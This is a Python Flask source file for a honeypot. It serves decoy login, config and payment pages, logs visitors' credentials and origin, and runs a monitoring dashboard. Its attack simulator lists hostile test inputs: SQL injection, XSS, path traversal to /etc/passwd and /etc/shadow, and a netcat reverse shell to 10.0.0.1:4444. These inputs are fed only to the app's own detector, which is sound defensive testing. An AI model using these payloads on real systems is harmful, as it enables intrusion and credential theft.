import os
import datetime
import threading
import functools
from ssh_honeypot import start_ssh_honeypot
from db_honeypot import start_db_honeypot
from email_honeypot import start_email_honeypot
from decoy import generate_decoy_zip
from threat_intel import check_ip, check_multiple_ips
from darkweb import get_dark_web_summary
from blockchain import get_blockchain_stats, log_to_blockchain, rebuild_from_attacks
from anomaly_detector import detect_anomaly, retrain as retrain_model, cluster_attacks, get_model_info
from report import generate_report
from flask import Flask, request, render_template, jsonify, Response, session, redirect, url_for
from intelligence import IntelligenceEngine
from logger import AttackLogger
from geoip import get_location
from alerts import send_alert
from email_alert import send_email_alert
import time
from collections import defaultdict

# ─────────────────────────────────────────
# UTILITY HELPERS (module-level, no duplication)
# ─────────────────────────────────────────

def detect_browser(ua: str) -> str:
    ua = ua.lower()
    if "sqlmap"  in ua: return "SQLMap (Auto Hacker)"
    if "nmap"    in ua: return "Nmap Scanner"
    if "python"  in ua: return "Python Script"
    if "curl"    in ua: return "curl (CLI)"
    if "wget"    in ua: return "wget (CLI)"
    if "postman" in ua: return "Postman"
    if "edg"     in ua: return "Edge"
    if "chrome"  in ua: return "Chrome"
    if "firefox" in ua: return "Firefox"
    if "safari"  in ua: return "Safari"
    return "Unknown"


def detect_os(ua: str) -> str:
    ua = ua.lower()
    if "windows nt 10" in ua: return "Windows 10/11"
    if "windows nt 6"  in ua: return "Windows 7/8"
    if "android"       in ua: return "Android"
    if "iphone"        in ua: return "iPhone (iOS)"
    if "mac os"        in ua: return "macOS"
    if "ubuntu"        in ua: return "Ubuntu"
    if "linux"         in ua: return "Linux"
    return "Unknown"


# ─────────────────────────────────────────
# DASHBOARD BASIC AUTH
# ─────────────────────────────────────────

from utils import load_env
load_env()

DASHBOARD_USER = os.environ.get("DASHBOARD_USER", "admin")
DASHBOARD_PASS = os.environ.get("DASHBOARD_PASS", "honeypot2026")

app = Flask(__name__, template_folder='../templates', static_folder='../static')
_flask_secret = os.environ.get("FLASK_SECRET", "")
if not _flask_secret:
    import warnings
    warnings.warn(
        "[SECURITY] FLASK_SECRET env var is not set — using insecure default key. "
        "Set FLASK_SECRET to a random 32+ character string in your .env file.",
        stacklevel=2
    )
    _flask_secret = "honeypot_secret_key_2026_change_me"
app.secret_key = _flask_secret

# ── Session security config ─────────────────────────────────
app.config["PERMANENT_SESSION_LIFETIME"] = datetime.timedelta(minutes=30)
app.config["SESSION_COOKIE_HTTPONLY"]    = True
app.config["SESSION_COOKIE_SAMESITE"]   = "Lax"


def require_auth(f):
    """Decorator: redirect to login page if not authenticated (or session expired)."""
    @functools.wraps(f)
    def decorated(*args, **kwargs):
        if not session.get("dashboard_authenticated"):
            return redirect(url_for("dashboard_login_page"))
        return f(*args, **kwargs)
    return decorated

intelligence = IntelligenceEngine()
logger = AttackLogger()

# Track IPs for brute force detection
login_attempts = defaultdict(list)
ip_endpoints = defaultdict(list)
_login_lock = threading.Lock()

# Per-IP rate limit: max requests per window
_RATE_LIMIT_MAX = 30   # max login POSTs per window
_RATE_LIMIT_WINDOW = 60  # seconds

# ─────────────────────────────────────────
# AUTO-SYNC BLOCKCHAIN ON STARTUP
# ─────────────────────────────────────────

def _auto_sync_blockchain():
    """On startup, rebuild the blockchain from attack.log if counts are out of sync."""
    import time as _time
    _time.sleep(3)  # wait for logger to fully initialize
    try:
        entries    = logger._load_all()
        bc_stats   = get_blockchain_stats()
        bc_count   = bc_stats.get("total_blocks", 0)
        atk_count  = len(entries)
        if bc_count != atk_count:
            print(f"[Blockchain] Auto-sync: {bc_count} blocks vs {atk_count} attacks — rebuilding...")
            rebuild_from_attacks(entries)
            print(f"[Blockchain] ✅ Auto-sync complete: {atk_count} blocks created")
        else:
            print(f"[Blockchain] ✅ Already in sync: {bc_count} blocks")
    except Exception as e:
        print(f"[Blockchain] Auto-sync error: {e}")

_sync_thread = threading.Thread(target=_auto_sync_blockchain, daemon=True)
_sync_thread.start()

# ─────────────────────────────────────────
# HONEYPOT PAGES
# ─────────────────────────────────────────

@app.route("/")
def home():
    _track_recon(request.remote_addr, "/")
    return render_template("login.html")

@app.route("/admin")
def admin():
    _track_recon(request.remote_addr, "/admin")
    return render_template("login.html")

@app.route("/wp-login.php")
def wp_login():
    _track_recon(request.remote_addr, "/wp-login.php")
    return render_template("login.html")

@app.route("/phpmyadmin")
def phpmyadmin():
    _track_recon(request.remote_addr, "/phpmyadmin")
    return render_template("login.html")

# ─────────────────────────────────────────
# FAKE INTERNAL PAGES (track every visit)
# ─────────────────────────────────────────

def _log_page_visit(ip, endpoint, payload, risk_score, risk_level, alert=False):
    user_agent = request.headers.get("User-Agent", "Unknown")
    referrer   = request.headers.get("Referer", "Direct")
    origin     = request.headers.get("Origin", "None")
    x_fwd      = request.headers.get("X-Forwarded-For", "None")
    accept_lang= request.headers.get("Accept-Language", "Unknown")

    location = get_location(ip)

    log_entry = {
        "ip":               ip,
        "username":         "post-login-visitor",
        "password":         "",
        "payload":          payload,
        "user_agent":       user_agent,
        "browser":          detect_browser(user_agent),
        "operating_system": detect_os(user_agent),
        "referrer":         referrer,
        "origin":           origin,
        "x_forwarded_for":  x_fwd,
        "accept_language":  accept_lang,
        "endpoint":         endpoint,
        "attack_type":      "Reconnaissance",
        "risk_score":       risk_score,
        "risk_level":       risk_level,
        "honeypot_type":    "WEB",
        "country":          location.get("country", "Unknown"),
        "city":             location.get("city", "Unknown"),
        "isp":              location.get("isp", "Unknown"),
        "lat":              location.get("lat", 0),
        "lon":              location.get("lon", 0),
    }
    logger.log(log_entry)
    if alert:
        send_alert(log_entry)
        send_email_alert(log_entry)

@app.route("/admin/dashboard")
def admin_dashboard():
    ip = request.remote_addr
    _track_recon(ip, "/admin/dashboard")
    _log_page_visit(
        ip=ip,
        endpoint="/admin/dashboard",
        payload="Visited fake admin dashboard",
        risk_score=4,
        risk_level="MEDIUM",
        alert=False
    )
    return render_template("admin_panel.html")

@app.route("/api/users")
def api_users():
    ip = request.remote_addr
    _track_recon(ip, "/api/users")
    _log_page_visit(
        ip=ip,
        endpoint="/api/users",
        payload="Accessed /api/users — attempted data theft",
        risk_score=7,
        risk_level="HIGH",
        alert=True
    )
    return render_template("api_users.html")

@app.route("/config.php")
def config_php():
    ip = request.remote_addr
    _track_recon(ip, "/config.php")
    _log_page_visit(
        ip=ip,
        endpoint="/config.php",
        payload="Accessed /config.php — credential harvesting attempt",
        risk_score=9,
        risk_level="HIGH",
        alert=True
    )
    return render_template("config.html")

@app.route("/backup.zip")
def backup_zip():
    ip = request.remote_addr
    _track_recon(ip, "/backup.zip")
    _log_page_visit(
        ip=ip,
        endpoint="/backup.zip",
        payload="DOWNLOADED backup.zip — decoy file served!",
        risk_score=10,
        risk_level="HIGH",
        alert=True
    )
    # Serve real decoy ZIP file
    zip_bytes = generate_decoy_zip()
    from flask import Response
    return Response(
        zip_bytes,
        mimetype="application/zip",
        headers={
            "Content-Disposition": "attachment; filename=thomascook_backup_2026_03_10.zip",
            "Content-Length": len(zip_bytes)
        }
    )


@app.route("/download/<filename>")
def download_decoy(filename):
    ip = request.remote_addr
    _log_page_visit(
        ip=ip,
        endpoint=f"/download/{filename}",
        payload=f"Attempted to download decoy file: {filename}",
        risk_score=9,
        risk_level="HIGH",
        alert=True
    )
    zip_bytes = generate_decoy_zip()
    from flask import Response
    return Response(
        zip_bytes,
        mimetype="application/zip",
        headers={
            "Content-Disposition": f"attachment; filename={filename}",
            "Content-Length": len(zip_bytes)
        }
    )

@app.route("/bookings")
def bookings():
    ip = request.remote_addr
    _track_recon(ip, "/bookings")
    _log_page_visit(
        ip=ip,
        endpoint="/bookings",
        payload="Accessed /bookings — customer data reconnaissance",
        risk_score=7,
        risk_level="HIGH",
        alert=True
    )
    return render_template("bookings.html")

@app.route("/flights")
def flights():
    ip = request.remote_addr
    _track_recon(ip, "/flights")
    _log_page_visit(
        ip=ip,
        endpoint="/flights",
        payload="Accessed /flights — flight data reconnaissance",
        risk_score=7,
        risk_level="HIGH",
        alert=True
    )
    return render_template("flights.html")

@app.route("/hotels")
def hotels():
    ip = request.remote_addr
    _track_recon(ip, "/hotels")
    _log_page_visit(
        ip=ip,
        endpoint="/hotels",
        payload="Accessed /hotels — hotel data reconnaissance",
        risk_score=7,
        risk_level="HIGH",
        alert=True
    )
    return render_template("hotels.html")

@app.route("/payments")
def payments():
    ip = request.remote_addr
    _track_recon(ip, "/payments")
    _log_page_visit(
        ip=ip,
        endpoint="/payments",
        payload="Accessed /payments — financial data theft attempt",
        risk_score=10,
        risk_level="HIGH",
        alert=True
    )
    return render_template("payments.html")

@app.route("/server-status")
def server_status():
    ip = request.remote_addr
    _track_recon(ip, "/server-status")
    _log_page_visit(
        ip=ip,
        endpoint="/server-status",
        payload="Accessed server-status — system reconnaissance",
        risk_score=7,
        risk_level="HIGH",
        alert=True
    )
    return render_template("server_status.html")

# ─────────────────────────────────────────
# LOGIN ROUTE
# ─────────────────────────────────────────

@app.route("/login", methods=["POST"])
def login():
    ip = request.remote_addr
    username = request.form.get("username", "")
    password = request.form.get("password", "")
    user_agent = request.headers.get("User-Agent", "Unknown")
    endpoint = "/login"
    payload = username + " " + password

    # ── Extra attacker data ──────────────────
    referrer     = request.headers.get("Referer", "Direct")
    accept_lang  = request.headers.get("Accept-Language", "Unknown")
    content_type = request.headers.get("Content-Type", "Unknown")
    x_forwarded  = request.headers.get("X-Forwarded-For", "None")
    origin       = request.headers.get("Origin", "None")

    browser = detect_browser(user_agent)
    operating_system = detect_os(user_agent)

    # Brute force tracking + rate limiting (lock protects against concurrent request races)
    now = time.time()
    with _login_lock:
        login_attempts[ip].append(now)
        login_attempts[ip] = [t for t in login_attempts[ip] if now - t < _RATE_LIMIT_WINDOW]
        current_login_count = len(login_attempts[ip])

    # Hard rate limit — return 429 to stop log-flooding scripts
    if current_login_count > _RATE_LIMIT_MAX:
        return jsonify({"error": "Too many requests"}), 429

    # Run intelligence engine
    attack_info = intelligence.analyze(
        payload=payload,
        ip=ip,
        endpoint=endpoint,
        login_count=current_login_count,
        recon_count=len(ip_endpoints.get(ip, []))
    )

    # Get geolocation
    location = get_location(ip)

    # Build full log entry
    log_entry = {
        "ip": ip,
        "username": username,
        "password": password,
        "payload": payload,
        "user_agent": user_agent,
        "browser": browser,
        "operating_system": operating_system,
        "referrer": referrer,
        "accept_language": accept_lang,
        "content_type": content_type,
        "x_forwarded_for": x_forwarded,
        "origin": origin,
        "endpoint": endpoint,
        "attack_type": attack_info["attack_type"],
        "risk_score": attack_info["risk_score"],
        "risk_level": attack_info["risk_level"],
        "honeypot_type": "WEB",
        "country": location.get("country", "Unknown"),
        "city": location.get("city", "Unknown"),
        "isp": location.get("isp", "Unknown"),
        "lat": location.get("lat", 0),
        "lon": location.get("lon", 0),
    }

    logger.log(log_entry)

    # Send alert for high-risk attacks
    if attack_info["risk_level"] == "HIGH":
        send_alert(log_entry)
        send_email_alert(log_entry)

    # If attack detected — reject with error
    # If normal login — let them inside fake admin panel
    if attack_info["attack_type"] != "Normal":
        return render_template("login.html", error="Invalid credentials. Please try again.")
    else:
        return render_template("admin_panel.html", username=username)

# ─────────────────────────────────────────
# DASHBOARD API ENDPOINTS
# ─────────────────────────────────────────

@app.route("/dashboard-login", methods=["GET", "POST"])
def dashboard_login_page():
    if session.get("dashboard_authenticated"):
        return redirect(url_for("dashboard"))
    error = None
    if request.method == "POST":
        username = request.form.get("username", "")
        password = request.form.get("password", "")
        if username == DASHBOARD_USER and password == DASHBOARD_PASS:
            session.permanent = True          # enables 30-min timeout
            session["dashboard_authenticated"] = True
            return redirect(url_for("dashboard"))
        error = "Invalid username or password."
    return render_template("dashboard_login.html", error=error)


@app.route("/dashboard-logout")
def dashboard_logout():
    session.pop("dashboard_authenticated", None)
    return redirect(url_for("dashboard_login_page"))


@app.route("/dashboard")
@require_auth
def dashboard():
    return render_template("dashboard.html")

@app.route("/map")
@require_auth
def attack_map():
    return render_template("map.html")

# ─────────────────────────────────────────
# ATTACK SIMULATOR
# ─────────────────────────────────────────

@app.route("/api/simulate", methods=["POST"])
@require_auth
def simulate_attack():
    import threading

    attack_scenarios = [
        {"name":"SQL Injection",      "username":"' OR 1=1 --",                      "password":"anything",     "delay":0.0},
        {"name":"XSS Attack",         "username":"<script>alert('XSS')</script>",     "password":"password",     "delay":1.0},
        {"name":"Command Injection",  "username":"admin; whoami && cat /etc/passwd",  "password":"pass",         "delay":2.0},
        {"name":"Path Traversal",     "username":"../../../../etc/passwd",            "password":"test",         "delay":3.0},
        {"name":"Brute Force",        "username":"admin",                             "password":"password123",  "delay":4.0, "repeat":3},
        {"name":"Reconnaissance",     "username":"admin",                             "password":"admin",        "delay":5.0, "recon":True},
        {"name":"SQL Injection",      "username":"' UNION SELECT * FROM users --",    "password":"x",            "delay":6.0},
        {"name":"XSS Attack",         "username":"<img src=x onerror=alert(1)>",      "password":"pass",         "delay":7.0},
        {"name":"Brute Force",        "username":"root",                              "password":"toor",         "delay":8.0, "repeat":3},
        {"name":"Command Injection",  "username":"|| nc -e /bin/sh 10.0.0.1 4444",   "password":"x",            "delay":9.0},
        {"name":"Path Traversal",     "username":"..%2F..%2Fetc%2Fshadow",           "password":"test",         "delay":10.0},
        {"name":"SQL Injection",      "username":"admin'--",                          "password":"anything",     "delay":11.0},
        {"name":"XSS Attack",         "username":"javascript:alert(document.cookie)", "password":"pass",         "delay":12.0},
        {"name":"Brute Force",        "username":"administrator",                     "password":"admin@123",    "delay":13.0, "repeat":3},
        {"name":"Reconnaissance",     "username":"scanner",                           "password":"scan",         "delay":14.0, "recon":True},
        {"name":"Command Injection",  "username":"admin`id`",                         "password":"x",            "delay":15.0},
        {"name":"SQL Injection",      "username":"' OR 'x'='x",                      "password":"anything",     "delay":16.0},
        {"name":"Path Traversal",     "username":"/etc/passwd%00",                   "password":"test",         "delay":17.0},
        {"name":"XSS Attack",         "username":"<svg onload=alert(1)>",             "password":"pass",         "delay":18.0},
        {"name":"Brute Force",        "username":"superadmin",                        "password":"super@2026",   "delay":19.0, "repeat":3},
    ]

    def run_simulation():
        import time, random

        # Different attackers from around the world
        attackers = [
            {"ip":"103.21.58.12",  "country":"China",         "city":"Beijing",      "isp":"China Telecom",         "lat":39.9042,  "lon":116.4074},
            {"ip":"95.142.46.35",  "country":"Russia",        "city":"Moscow",       "isp":"JSC Rostelecom",        "lat":55.7558,  "lon":37.6173},
            {"ip":"41.203.64.21",  "country":"Nigeria",       "city":"Lagos",        "isp":"MTN Nigeria",           "lat":6.5244,   "lon":3.3792},
            {"ip":"177.54.144.90", "country":"Brazil",        "city":"Sao Paulo",    "isp":"Claro Brasil",          "lat":-23.5505, "lon":-46.6333},
            {"ip":"5.188.206.14",  "country":"Iran",          "city":"Tehran",       "isp":"Iranet",                "lat":35.6892,  "lon":51.3890},
            {"ip":"31.184.198.23", "country":"Ukraine",       "city":"Kyiv",         "isp":"Kyivstar",              "lat":50.4501,  "lon":30.5234},
            {"ip":"196.188.46.8",  "country":"Ethiopia",      "city":"Addis Ababa",  "isp":"Ethio Telecom",         "lat":9.0249,   "lon":38.7469},
            {"ip":"36.37.240.50",  "country":"Vietnam",       "city":"Ho Chi Minh",  "isp":"VNPT",                  "lat":10.8231,  "lon":106.6297},
            {"ip":"185.220.101.5", "country":"Germany",       "city":"Frankfurt",    "isp":"Tor Exit Node",         "lat":50.1109,  "lon":8.6821},
            {"ip":"45.142.212.10", "country":"Netherlands",   "city":"Amsterdam",    "isp":"Bulletproof Hosting",   "lat":52.3676,  "lon":4.9041},
            {"ip":"58.27.143.2",   "country":"Pakistan",      "city":"Karachi",      "isp":"PTCL",                  "lat":24.8607,  "lon":67.0011},
            {"ip":"197.210.84.34", "country":"South Africa",  "city":"Johannesburg", "isp":"MTN SA",                "lat":-26.2041, "lon":28.0473},
            {"ip":"80.94.92.11",   "country":"Romania",       "city":"Bucharest",    "isp":"RCS & RDS",             "lat":44.4268,  "lon":26.1025},
            {"ip":"61.19.240.50",  "country":"Thailand",      "city":"Bangkok",      "isp":"True Internet",         "lat":13.7563,  "lon":100.5018},
            {"ip":"14.102.44.21",  "country":"India",         "city":"Mumbai",       "isp":"Reliance Jio",          "lat":19.0760,  "lon":72.8777},
            {"ip":"190.214.13.88", "country":"Venezuela",     "city":"Caracas",      "isp":"CANTV",                 "lat":10.4806,  "lon":-66.9036},
            {"ip":"41.75.192.4",   "country":"Kenya",         "city":"Nairobi",      "isp":"Safaricom",             "lat":-1.2921,  "lon":36.8219},
            {"ip":"123.24.139.185","country":"Indonesia",     "city":"Jakarta",      "isp":"Telkom Indonesia",      "lat":-6.2088,  "lon":106.8456},
            {"ip":"212.58.111.23", "country":"Turkey",        "city":"Istanbul",     "isp":"Turk Telekom",          "lat":41.0082,  "lon":28.9784},
            {"ip":"41.248.67.12",  "country":"Morocco",       "city":"Casablanca",   "isp":"Maroc Telecom",         "lat":33.5731,  "lon":-7.5898},
        ]

        sim_ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0"

        for scenario_index, scenario in enumerate(attack_scenarios):
            time.sleep(scenario["delay"])
            repeat = scenario.get("repeat", 1)
            # Pick attacker for this scenario
            attacker = attackers[scenario_index % len(attackers)]

            for i in range(repeat):
                username = scenario["username"]
                password = scenario["password"]
                payload  = username + " " + password

                attack_info = intelligence.analyze(
                    payload=payload,
                    ip=attacker["ip"],
                    endpoint="/login",
                    login_count=i + 1,
                    recon_count=0
                )

                log_entry = {
                    "ip":               attacker["ip"],
                    "username":         username,
                    "password":         password,
                    "payload":          payload,
                    "user_agent":       sim_ua,
                    "browser":          "Chrome",
                    "operating_system": "Windows 10/11",
                    "referrer":         "Direct",
                    "origin":           "None",
                    "x_forwarded_for":  "None",
                    "accept_language":  "en-US",
                    "endpoint":         "/login",
                    "attack_type":      attack_info["attack_type"],
                    "risk_score":       attack_info["risk_score"],
                    "risk_level":       attack_info["risk_level"],
                    "honeypot_type":    "WEB",
                    "country":          attacker["country"],
                    "city":             attacker["city"],
                    "isp":              attacker["isp"],
                    "lat":              attacker["lat"],
                    "lon":              attacker["lon"],
                }

                logger.log(log_entry)

                if attack_info["risk_level"] == "HIGH":
                    send_alert(log_entry)
                    send_email_alert(log_entry)

                if repeat > 1:
                    time.sleep(0.4)

            # Recon simulation — visit fake pages
            if scenario.get("recon"):
                recon_pages = [
                    "/admin", "/phpmyadmin",
                    "/wp-login.php", "/config.php",
                    "/backup.zip", "/server-status"
                ]
                for page in recon_pages:
                    recon_entry = {
                        "ip":               attacker["ip"],
                        "username":         "recon-scanner",
                        "password":         "",
                        "payload":          f"Scanned {page}",
                        "user_agent":       sim_ua,
                        "browser":          "Chrome",
                        "operating_system": "Windows 10/11",
                        "referrer":         "Direct",
                        "origin":           "None",
                        "x_forwarded_for":  "None",
                        "accept_language":  "en-US",
                        "endpoint":         page,
                        "attack_type":      "Reconnaissance",
                        "risk_score":       4,
                        "risk_level":       "MEDIUM",
                        "country":          attacker["country"],
                        "city":             attacker["city"],
                        "isp":              attacker["isp"],
                        "lat":              attacker["lat"],
                        "lon":              attacker["lon"],
                    }
                    logger.log(recon_entry)
                    time.sleep(0.3)

        print("[Simulator] ✅ All 6 attack scenarios completed!")

    # Run in background thread so API returns immediately
    thread = threading.Thread(target=run_simulation)
    thread.daemon = True
    thread.start()

    return jsonify({
        "status":   "started",
        "message":  "Simulation running — 6 attacks firing over 12 seconds",
        "attacks":  [s["name"] for s in attack_scenarios],
        "duration": "~12 seconds"
    })

@app.route("/api/stats")
@require_auth
def api_stats():
    return jsonify(logger.get_stats())

@app.route("/api/recent")
@require_auth
def api_recent():
    htype = request.args.get("type", "ALL").upper()
    entries = logger.get_recent(500)   # fetch a large pool to filter from
    if htype != "ALL":
        entries = [e for e in entries if e.get("honeypot_type", "WEB") == htype]
    return jsonify(entries[:20])

@app.route("/api/timeline")
@require_auth
def api_timeline():
    return jsonify(logger.get_timeline())

@app.route("/api/report")
@require_auth
def api_report():
    import tempfile
    from flask import send_file
    stats  = logger.get_stats()
    stats["honeypot_types"] = logger.get_honeypot_stats()
    recent = logger.get_recent(50)
    now    = datetime.datetime.utcnow()
    fname  = f"honeypot_report_{now.strftime('%Y_%m_%d_%H%M')}.pdf"
    path   = os.path.join(tempfile.gettempdir(), fname)
    generate_report(stats, recent, path)
    return send_file(path, as_attachment=True,
                     download_name=fname, mimetype="application/pdf")

@app.route("/api/hourly")
@require_auth
def api_hourly():
    return jsonify(logger.get_hourly_heatmap())

@app.route("/aws-console")
@app.route("/aws")
@app.route("/cloud-admin")
def aws_console():
    return render_template("aws_console.html")

@app.route("/aws-login", methods=["POST"])
def aws_login():
    import json as _json
    data        = request.get_json() or {}
    account_type= data.get("account_type", "root")
    email       = data.get("email", "")
    account_id  = data.get("account_id", "")
    iam_user    = data.get("iam_user", "")
    password    = data.get("password", "")

    username    = email or f"{account_id}/{iam_user}"
    payload     = f"AWS {account_type.upper()} login attempt — {username}"

    attack_info = intelligence.analyze(
        payload=payload, ip=request.remote_addr,
        endpoint="/aws-console", login_count=1, recon_count=0
    )
    location = get_location(request.remote_addr)
    log_entry = {
        "ip":               request.remote_addr,
        "username":         username,
        "password":         password,
        "payload":          payload,
        "user_agent":       request.headers.get("User-Agent",""),
        "browser":          request.headers.get("User-Agent","")[:50],
        "operating_system": "Unknown",
        "referrer":         request.referrer or "Direct",
        "origin":           request.headers.get("Origin",""),
        "x_forwarded_for":  request.headers.get("X-Forwarded-For",""),
        "accept_language":  request.headers.get("Accept-Language",""),
        "endpoint":         "/aws-console",
        "attack_type":      "Cloud Credential Theft",
        "risk_score":       10,
        "risk_level":       "HIGH",
        "country":          location.get("country","Unknown"),
        "city":             location.get("city","Unknown"),
        "isp":              location.get("isp","Unknown"),
        "lat":              location.get("lat",0),
        "lon":              location.get("lon",0),
        "honeypot_type":    "WEB",
    }
    logger.log(log_entry)
    send_alert(log_entry)
    send_email_alert(log_entry)
    return jsonify({"status": "error", "message": "Invalid credentials"})

@app.route("/darkweb")
@require_auth
def darkweb_page():
    return render_template("darkweb.html")

@app.route("/api/darkweb")
@require_auth
def api_darkweb():
    return jsonify(get_dark_web_summary())

@app.route("/api/export/csv")
@require_auth
def export_csv():
    import csv, io
    entries = logger._load_all()
    output  = io.StringIO()
    writer  = csv.writer(output)
    writer.writerow([
        "Timestamp","IP","Country","City","ISP",
        "Attack Type","Risk Level","Risk Score",
        "Endpoint","Payload","Browser","OS",
        "Honeypot Type","Username","Password"
    ])
    for e in entries:
        writer.writerow([
            e.get("timestamp",""),
            e.get("ip",""),
            e.get("country",""),
            e.get("city",""),
            e.get("isp",""),
            e.get("attack_type",""),
            e.get("risk_level",""),
            e.get("risk_score",""),
            e.get("endpoint",""),
            e.get("payload","")[:100],
            e.get("browser",""),
            e.get("operating_system",""),
            e.get("honeypot_type","WEB"),
            e.get("username",""),
            e.get("password",""),
        ])
    output.seek(0)
    from flask import Response
    return Response(
        output.getvalue(),
        mimetype="text/csv",
        headers={"Content-Disposition":
            f"attachment; filename=honeypot_attacks_{datetime.datetime.now().strftime('%Y%m%d_%H%M')}.csv"}
    )

@app.route("/blockchain")
@require_auth
def blockchain_page():
    return render_template("blockchain.html")

@app.route("/api/blockchain")
@require_auth
def api_blockchain():
    return jsonify(get_blockchain_stats())

@app.route("/anomaly")
@require_auth
def anomaly_page():
    return render_template("anomaly.html")

@app.route("/api/anomaly")
@require_auth
def api_anomaly():
    entries = logger._load_all()
    analyzed = []
    for e in entries:
        if "anomaly" not in e:
            # Run detection on-the-fly for older entries that were logged before ML was active
            try:
                anomaly = detect_anomaly(e)
                e["anomaly"]         = bool(anomaly["is_anomaly"])
                e["anomaly_score"]   = float(anomaly["anomaly_score"])
                e["anomaly_label"]   = str(anomaly["label"])
                e["anomaly_reasons"] = [str(r) for r in anomaly["reasons"]]
            except Exception:
                e["anomaly"]         = False
                e["anomaly_score"]   = 0.0
                e["anomaly_label"]   = "NORMAL"
                e["anomaly_reasons"] = []
        analyzed.append(e)

    anomalies = [e for e in analyzed if e.get("anomaly") == True]
    normal    = [e for e in analyzed if e.get("anomaly") == False]
    total_analyzed = len(analyzed)
    anom_count     = len(anomalies)
    normal_count   = len(normal)
    anomalies_sorted = sorted(anomalies, key=lambda x: x.get("timestamp", ""), reverse=True)
    return jsonify({
        "total_analyzed":   total_analyzed,
        "anomalies_found":  anom_count,
        "normal_count":     normal_count,
        "anomaly_rate":     round((anom_count / total_analyzed * 100) if total_analyzed > 0 else 0, 1),
        "recent_anomalies": anomalies_sorted[:20],
    })

@app.route("/api/anomaly/retrain", methods=["POST"])
@require_auth
def api_retrain():
    result = retrain_model()
    return jsonify(result)

@app.route("/api/anomaly/clusters")
@require_auth
def api_anomaly_clusters():
    """Run DBSCAN clustering on all attack logs to identify attack campaigns."""
    entries = logger._load_all()
    result  = cluster_attacks(entries)
    return jsonify(result)

@app.route("/api/anomaly/model-info")
@require_auth
def api_anomaly_model_info():
    """Return ML model metadata for dashboard display."""
    return jsonify(get_model_info())


@app.route("/api/admin/rebuild-blockchain", methods=["POST"])
@require_auth
def api_rebuild_blockchain():
    """Rebuild the blockchain from scratch using all entries in attack.log.
    Call this once to sync the blockchain block count with the attack count."""
    entries = logger._load_all()
    count   = rebuild_from_attacks(entries)
    return jsonify({
        "status":        "ok",
        "blocks_added":  count,
        "total_attacks": len(entries),
        "message":       f"Blockchain rebuilt: {count} blocks from {len(entries)} attacks",
    })

@app.route("/api/honeypot-stats")
@require_auth
def api_honeypot_stats():
    return jsonify(logger.get_honeypot_stats())

@app.route("/api/profile/<ip>")
@require_auth
def api_profile(ip):
    from urllib.parse import unquote
    ip = unquote(ip)
    sessions = logger.get_sessions()
    # Find this IP's session
    ip_session = next((s for s in sessions if s["ip"] == ip), None)
    if not ip_session:
        return jsonify({"error": "IP not found"}), 404
    # Get threat intel (cached)
    try:
        threat = check_ip(ip)
    except Exception:
        threat = {"threat_level": "UNKNOWN", "threat_score": 0, "flags": []}
    return jsonify({"session": ip_session, "threat": threat})

@app.route("/profile/<ip>")
@require_auth
def profile_page(ip):
    return render_template("profile.html")

@app.route("/api/sessions")
@require_auth
def api_sessions():
    return jsonify(logger.get_sessions())

@app.route("/api/threat/<ip>")
@require_auth
def api_threat_single(ip):
    result = check_ip(ip)
    return jsonify(result)

@app.route("/api/threat/batch", methods=["POST"])
@require_auth
def api_threat_batch():
    data = request.get_json()
    ips  = data.get("ips", [])
    results = check_multiple_ips(ips)
    return jsonify(results)

@app.route("/threat")
@require_auth
def threat_page():
    return render_template("threat.html")

@app.route("/sessions")
@require_auth
def sessions_page():
    return render_template("sessions.html")

@app.route("/api/mapdata")
@require_auth
def api_mapdata():
    entries = logger.get_recent(100)
    points = []
    seen = set()
    for e in entries:
        lat = e.get("lat", 0)
        lon = e.get("lon", 0)
        ip  = e.get("ip", "")
        if lat == 0 and lon == 0:
            continue
        key = f"{lat},{lon}"
        if key in seen:
            continue
        seen.add(key)
        points.append({
            "lat":         lat,
            "lon":         lon,
            "ip":          ip,
            "country":     e.get("country", "Unknown"),
            "city":        e.get("city", "Unknown"),
            "attack_type": e.get("attack_type", "Unknown"),
            "risk_level":  e.get("risk_level", "LOW"),
            "risk_score":  e.get("risk_score", 0),
            "timestamp":   e.get("timestamp", ""),
        })
    return jsonify(points)
# ─────────────────────────────────────────
# HELPERS
# ─────────────────────────────────────────

def _track_recon(ip, endpoint):
    now = time.time()
    ip_endpoints[ip].append({"endpoint": endpoint, "time": now})
    ip_endpoints[ip] = [e for e in ip_endpoints[ip] if now - e["time"] < 60]


if __name__ == "__main__":
    # Start SSH Honeypot on port 2222 in background thread
    ssh_thread = threading.Thread(
        target=start_ssh_honeypot,
        args=(logger,),
        daemon=True
    )
    ssh_thread.start()
    print("[App] SSH Honeypot started on port 2222")

    # Start Flask web server
    # Start DB Honeypot on port 27017
    db_thread = threading.Thread(
        target=start_db_honeypot,
        args=(logger,),
        daemon=True
    )
    db_thread.start()
    print("[App] DB Honeypot started on port 27017")

    # Start Email Honeypot on port 2525
    email_thread = threading.Thread(
        target=start_email_honeypot,
        args=(logger,),
        daemon=True
    )
    email_thread.start()
    print("[App] Email Honeypot started on port 2525")

    app.run(host="0.0.0.0", port=5000, debug=False)
